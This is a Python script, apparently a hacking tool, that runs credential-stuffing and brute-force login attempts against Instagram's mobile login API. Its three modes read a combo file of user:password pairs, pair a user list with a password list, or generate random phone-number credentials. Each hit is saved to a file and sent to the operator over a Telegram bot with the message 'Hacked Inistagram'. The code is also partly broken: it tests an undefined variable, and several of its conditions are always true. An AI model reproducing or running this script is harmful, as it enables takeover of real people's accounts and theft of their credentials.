
import os
from time import sleep
os.system("title " + " ")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
print("\033[1;92m ")
def banner():
    print("""
▄▄▄█████▓ ██▓   ▓██   ██▓ ▄▄▄       ██ ▄█▀
▓  ██▒ ▓▒▓██▒    ▒██  ██▒▒████▄     ██▄█▒ 
▒ ▓██░ ▒░▒██░     ▒██ ██░▒██  ▀█▄  ▓███▄░ 
░ ▓██▓ ░ ▒██░     ░ ▐██▓░░██▄▄▄▄██ ▓██ █▄ 
  ▒██▒ ░ ░██████▒ ░ ██▒▓░ ▓█   ▓██▒▒██▒ █▄
  ▒ ░░   ░ ▒░▓  ░  ██▒▒▒  ▒▒   ▓▒█░▒ ▒▒ ▓▒
    ░    ░ ░ ▒  ░▓██ ░▒░   ▒   ▒▒ ░░ ░▒ ▒░
  ░        ░ ░   ▒ ▒ ░░    ░   ▒   ░ ░░ ░ 
             ░  ░░ ░           ░  ░░  ░   
                 ░ ░                      
""")

banner()
print("")
print("\n[!] Done Download All Libareis ")
h , b,s,block = 0,0,0,0
tele = input("[+] AMADAY :   ")
if "Y" in tele:
    id = input("[+] ID TLEGRAMT : ")
    bot = input("[+] TOKEN BOT : ")
elif "y" in tele:
    id = input("[+] ID TLEGRAMT : ")
    bot = input("[+] TOKEN BOT : ")
print("==========================")
ask = input("""[1] CHEKER COMBO.TXT
[3] CHEKER NUMBER+NUMBER
==========================
[+] Hlbzhera : """)
if ask == "3":
   
    make = '0123456789'
    clear()
    banner()
    print("")
    print(f"\r                  GOOD : {h} | SCURUTY : {b}  {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+057' + us
        pasw = '057' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hacked Inistagram Number : {user} \n Password : {pasw}")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   GOOD : {h} | SCURUTY : {b}   {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   GOOD : {h} | SCURUTY : {b} {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                   GOOD : {h} | SCURUTY : {b} {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   GOOD : {h} | SCURUTY : {b} {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  GOOD : {h} | SCURUTY: {block}",end='')
        else:
            b+=1    
            print(f"\r GOOD : {h} | SCURUTY : {b}  {block}",end='')
elif ask =="2":
    clear()
    banner()
    print("")
    print(f"\r                   GOOD : {h} | SCURUTY : {b}  {block}",end='')
    user = open("Users.txt","r").read().splitlines()  
    pasw = open("Pass.txt","r").read().splitlines()    
    for u in user:
        for p in pasw:    
            req = requests.session()
            log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
            uid = str(uuid4())
            log_data = {
                'uuid': uid,
                'password': p,
                'username': u,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
            #print(r.text)
            if "logged_in_user" in r.text:
                  if "Y" or "y" in tele:
                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hacked Inistagram Number : {u} \nPass : ")
         
                    open("Hited Accounts.txt","a").write(f"{u}:{p}\n")
                    h += 1
                    print(f"\r                   GOOD : {h}  SCURUTY : {b} {block}",end='')
            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
                b += 1
                print(f"\r                   GOOD : {h} | SCURUTY : {b}  {block}",end='')
            elif 'challenge_required' in log.text:
                s += 1
                print(f"\r                  GOOD : {h} | SCURUTY : {b}  {block}",end='')
                open("Scure.txt","w").write(f"{user}:{pasw}\n")
            elif 'Please wait a few minutes' in log.text:
                block += 1
                print(f"\r                   GOOD : {h} | SCURUTY : {b}  {block}",end='')
            elif 'Bad request' in log.text:
                b += 1
                print(f"\r                   GOOD : {h} | SCURUTY : {b}  {block}",end='')
            else:
                b+=1    
                print(f"\r                  GOOD : {h} | SCURUTY : {b}  {block}",end='')
#==================================================================
elif ask =="1":
    assk = input("File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r                    GOOD : {h} | SCURUTY : {b}  {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello Hacked Inistagram\n\n Number : {user} \n Password : {pasw}\n\nCh : ")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                    GOOD : {h} | SCURUTY : {b}   {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                    GOOD : {h} | SCURUTY : {b} {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                    GOOD : {h} | SCURUTY : {b}  {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                    GOOD : {h} | SCURUTY : {b} {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   GOOD : {h} | Bad : {b} {block}",end='')
        else:
            b+=1    
            print(f"\r                    GOOD : {h} | SCURUTY :  {block}",end='')

    
